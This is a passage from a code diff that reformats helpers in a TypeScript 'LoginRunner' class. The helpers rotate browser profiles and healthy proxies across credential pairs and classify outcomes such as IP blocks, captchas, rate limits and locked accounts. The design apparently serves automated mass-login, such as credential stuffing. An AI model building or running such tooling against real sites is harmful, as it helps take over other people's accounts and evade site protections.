+    const available = this.profiles.filter(
+      (p) =>
+        pool.includes(p.id) &&
+        p.id !== currentProfile.id &&
+        p.status === "idle",
     );
 
     if (available.length === 0) return null;
@@ -1369,37 +1660,54 @@ export class LoginRunner {
 
   // ── Helpers ───────────────────────────────────────────────────────────────
 
-  private _pickProfile(pool: string[], credential: CredentialPair): Profile | null {
+  private _pickProfile(
+    pool: string[],
+    credential: CredentialPair,
+  ): Profile | null {
     // Prefer previously used profile for this credential (continuity)
     if (credential.profile_id) {
-      const prev = this.profiles.find(p => p.id === credential.profile_id && p.status === "idle");
+      const prev = this.profiles.find(
+        (p) => p.id === credential.profile_id && p.status === "idle",
+      );
       if (prev) return prev;
     }
     // Otherwise pick next idle from pool
-    const idle = this.profiles.filter(p => pool.includes(p.id) && p.status === "idle");
+    const idle = this.profiles.filter(
+      (p) => pool.includes(p.id) && p.status === "idle",
+    );
     if (idle.length === 0) return null;
     return idle[Math.floor(Math.random() * idle.length)];
   }
 
   private _resolveProxy(profile: Profile): ProxyConfig | null {
     if (!profile.proxy_id) return null;
-    const p = this.proxies.find(x => x.id === profile.proxy_id);
+    const p = this.proxies.find((x) => x.id === profile.proxy_id);
     if (!p || !p.healthy) return null;
     return { server: p.server, username: p.username, password: p.password };
   }
 
   private _outcomeToCredStatus(outcome: AttemptOutcome): CredentialStatus {
     switch (outcome) {
-      case "success":              return "success";
-      case "wrong_credentials":    return "failed";
-      case "account_locked":       return "hard_blocked";
-      case "ip_blocked":           return "soft_blocked";
-      case "captcha_block":        return "soft_blocked";
-      case "rate_limited":         return "soft_blocked";
-      case "2fa_required":         return "error";
-      case "unexpected_redirect":  return "error";
-      case "timeout":              return "error";
-      case "error":                return "error";
+      case "success":
+        return "success";
+      case "wrong_credentials":
+        return "failed";
+      case "account_locked":
+        return "hard_blocked";
+      case "ip_blocked":
+        return "soft_blocked";
+      case "captcha_block":
+        return "soft_blocked";
+      case "rate_limited":
+        return "soft_blocked";
+      case "2fa_required":
+        return "error";
+      case "unexpected_redirect":
+        return "error";
+      case "timeout":
+        return "error";
+      case "error":
+        return "error";
     }
   }
 
